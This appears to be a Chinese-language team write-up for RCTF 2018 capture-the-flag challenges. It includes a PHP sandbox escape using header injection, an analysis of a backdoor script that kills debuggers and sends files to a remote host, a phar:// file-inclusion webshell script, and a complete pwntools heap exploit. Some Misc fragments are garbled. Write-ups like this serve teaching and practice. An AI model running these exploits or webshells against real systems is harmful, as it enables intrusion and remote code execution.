> Team：De1ta
## 0x00 Web
### **AMP**
由cookie提示flag在admin的cookie 应该是xss
post后会log
应该和amp标准有关 : 
AMP规范 : 
猜测使用AMP特性绕过csp打到cookie
AMP获取cookies的方法：
网页源码里有句注释：  
payload:
        This site uses cookies to personalize content.
        Learn more.
       I accept
url编码后在浏览器触发  
flag: **RCTF{El_PsY_CONGRO0_sg0}**
### **r-cursive**
访问后在../sandbox/生成一个sha1文件夹，然后复制模板进去，提供了重定向到该文件夹和重置文件夹的功能  
重定向后是个php沙箱，只能执行格式为`xxxx();`的函数  
可以递归执行函数，不允许带参数  
?cmd=print(readdir(opendir(getcwd()))); 可以列目录  
?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件  
?cmd=print(dirname(dirname(getcwd()))); print出/var/www
翻阅文档找到`getallheaders()`函数，会返回所有的http请求头，因为header可控，所以可执行任意命令了  
?cmd=print(implode(getallheaders()));  
命令执行：
    GET /?cmd=eval(implode(getallheaders())); HTTP/1.1
    cmd: phpinfo(); //
    Host: 39093088bf9a9d33d5dd5b973cc1232e2145ee49.sandbox.r-cursive.ml
接下来沙盒逃逸，从phpinfo看，这里是开了mod_vhost_alias  
这里是利用auto_prepend来载入sandbox下的init.php来设置沙盒的open_basedir  
所以这里通过修改host来逃逸沙盒的open_basedir。
  1. 正常的open_basedir:
    GET /?cmd=eval(implode(getallheaders())); HTTP/1.1
    cmd: echo ini_get('open_basedir');//
    Host: 39093088bf9a9d33d5dd5b973cc1232e2145ee49.sandbox.r-cursive.ml
    Content-Length: 4
  1. 把host头的39093088bf9a9d33d5dd5b973cc1232e2145ee49.sandbox去掉：
        GET /?cmd=eval(implode(getallheaders())); HTTP/1.1
    cmd: echo ini_get('open_basedir');//
    Host: .r-cursive.ml
403是因为webroot没有index.php，正好说明已经逃逸出了沙盒  
所以去访问39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php 即可调用命令
  2. 借用39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php来执行命令：
        GET /39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php?cmd=eval(implode(getallheaders())); HTTP/1.1
    cmd: echo ini_get('open_basedir');//
    Host:  .r-cursive.ml
  3. 拿到flag
        GET /39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php?cmd=eval(implode(getallheaders())); HTTP/1.1
    cmd: echo ini_get('open_basedir');$myfile=fopen('/var/www/sandbox/init.php','r');echo fread($myfile,9999);//
    Host:  .r-cursive.ml
### **backdoor**
题目的附件在RE 的complier  
解压出来是一个archlinux的ISO,直接扔进vmware启动就行  
/root文件夹下有helloworld.c和wallpaper.jpg两个文件，图片提取出来一个no_hint.txt：  
用wireshark抓取虚拟机用gcc编译时的流量，发现会从  
下载了一个bash脚本：  
该脚本的主要工作为：
>   1.
> 检测是否有wireshark|tshark|idaq|strace|gdb|edb|lldb|lida|hopper|r2|radare2进程，如果有，就向[http://backdoor.2018.teamrois.cn/post.php?action=debugging&count=$debuggers发送“Oh](http://backdoor.2018.teamrois.cn/post.php?action=debugging&count=$debuggers发送“Oh),
> no! He's debugging! I'll kill them!!!!!!”，并杀死相关进程；
>   2. 执行head -c100000 /dev/urandom > /tmp/random.txt
> 命令，将/tmp/random.txt打包为zip并发送给
>   3. echo "Did you find the backdoor?" > ~/rctf-backdoor.txt
>
访问：  
查看源代码，有一段aaencode
解码得到到
    document.loginform.onsubmit = function (e) { 
        e.preventDefault()
        document.getElementById('wp-submit').disabled = 'disabled'
        setTimeout(function () {
            document.getElementById('wp-submit').removeAttribute('disabled')
            alert('Login failed')
            "What? Need hint?"
            "index.php is a hint!"
        }, 3000)
    }
意识到这个登陆页没啥用  
在  
寻找突破口，发现可以文件读取
读post.php源码
    http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=post
post.php
upload.php
    open($file['tmp_name'])) {
        echo 'No a valid zip';
        exit;
    }
    if (false === $zip->getFromName('tmp/random.txt')) {
        echo 'No file';
        exit;
    }
    $dest = 'uploads/' . md5($_SERVER['REMOTE_ADDR']) . hash('sha256', file_get_contents($file['tmp_name'])) . '.zip';
    move_uploaded_file($file['tmp_name'], $dest);
    echo 'Saved into ' . $dest;
post.php存在限制后缀的文件包含，可以通过phar://或者zip://协议绕过，从而包含恶意代码getshell，upload.php中限制了上传的文件要是个zip并且里面要有个random.txt文件。
我们在压缩包中再加入一个 evil.php 文件，当通过post.php 访问 action=phar://dest/evil 时，即访问
phar://dest/evil.php 注意 post.php 中的代码`include $_GET['action'] . '.php'`
最终构造exp如下，对应的压缩包tmp.zip已经作为附件上传。
exp.py:
    import requests
    s = "Saved into "
    post_url = "http://backdoor.2018.teamrois.cn/post.php?action=upload"
    zip_file = open("tmp.zip","rb")
    upload_file = {'file':zip_file}
    r = requests.post(post_url,files=upload_file)
    dest = r.text[len(s):]
    shell_url = "http://backdoor.2018.teamrois.cn/post.php?action=phar://"+ dest + "/evil"
    print("[*] shell url: " + shell_url)
    while  True:
        command = input("command: ")
        payload = {'chybeta': 'system("%s");' % command}
        r = requests.get(shell_url,params=payload)
        print(r.text)
## 0x01 Misc
### **sign**
elf文件，binwalk一下有发现，binwalk提取出其中的png文件，是这样的：  
提示wine
用wine运行getflag：  
### **git**
给了个git文件夹，估计flag是藏在提交历史里，  
getflag：  
### **cats**
题目要求找出15个命令xxx，使得xxx food的输出结果等于cat food的输出结果  
在本地docker测试可以免掉验证码
    echo 'food'>yourCatFood
    docker run -it --rm --network none -v /tmp/yourCatFood:/app/food:ro rctf_cats bash -c "timeout 5 diff -Z  
\o/ o/ o/ | |
| **_  o**/_
| \ \ | |
 \o \ / o 
| v\ o o  / \ / \
In every round of the game, I'll choose some different numbers from the figure  
interval. You are required to guess those numbers,ofc so does the order of
them.
On each surmise of yours, 2 numbers will be told as a hint for you, but you
need  
to speculate the fuctions of these 2 figures. (XD
GLHF
================== round 1 ==================
Give me 4 numbers, in[0, 10), You can only try 6 times
脚本可以生成每关结果，然后半自动玩游戏23333  
### **520gift**
找出美妆博主：  
flag： **RCTF{rbdlmlombrslj}**
## 0x02 Pwn
### **BabyHeap**
最基础的off by null  
chunk overlap + fastbin attack 极限利用.....做起来很不舒服......  
思路首先是利用off by null来chunk overlap ， chunk overlap之后利用fast bin  
attack来get shell，基本上全是套路.........
    from pwn import *
    debug=0
    e=ELF('./libc.so')
    context.log_level='debug'
    if debug:
        p=process('./babyheap',env={'LD_PRELOAD':'./libc.so'})
        context.log_level='debug'
        gdb.attach(p)
    else:
        p=remote('babyheap.2018.teamrois.cn',3154)
    def ru(x):
        return p.recvuntil(x)
    def se(x):
        p.send(x)
    def alloc(sz,content):
        se('1\n')
        ru('please input chunk size:')
        se(str(sz)+'\n')
        ru('input chunk content:')
        se(content)
        ru('choice:')
    def show(idx):
        se('2\n')
        ru('please input chunk index:')
        se(str(idx)+'\n')
        ru('content: ')
        data=ru('1. ')
        ru('choice:')
        return data
    def delete(idx):
        se('3\n')
        ru('please input chunk index:')
        se(str(idx)+'\n')
        ru('choice:')
    #-------------init----------------    alloc(0x48,'0\n')
    alloc(0xf9,(p64(0x100)+p64(0x21))*0x10)
    alloc(0xa8,'2'*8+p64(0x21)*10+'\n')
    alloc(0x100,'3\n')
    #-----------off by null-------------    delete(1)
    delete(0)
    alloc(0x48,'a'*0x48)
    #----------chunk overlap--------    alloc(0x88,'1\n')
    alloc(0x68,'4\n')
    delete(1)
    delete(2)
    #-----------leak libc----------------    alloc(0x88,'1\n')
    libc=u64(show(4)[:6]+'\x00\x00')
    base=libc-0x3C4B78
    malloc_hook=base+e.symbols['__malloc_hook']
    #-----------fast bin attack-----------    delete(1)
    alloc(0xa8,'a'*0x88+p64(0x71)+'\n')
    delete(4)
    delete(1)
    alloc(0xa8,'a'*0x88+p64(0x71)+p64(malloc_hook-0x23)+'\n')
    alloc(0x68,'t\n')
    alloc(0x68,'a'*3+p64(base+0xf1147)*2+p64(base+0x846D0)+'\n')
    print(hex(base))
    print(hex(base+0x846D0))
    p.interactive()
flag: **RCTF{Let_us_w4rm_up_with_a_e4sy_NU11_byte_overflow_lul_7adf58}**
### **simulator**
这是一个mips的指令模拟器，先输入mips的汇编代码，然后会解析成二进制，之后根据二进制来执行对应的操作，在主函数那里貌似有一个栈溢出，但是leak不出来cookie…….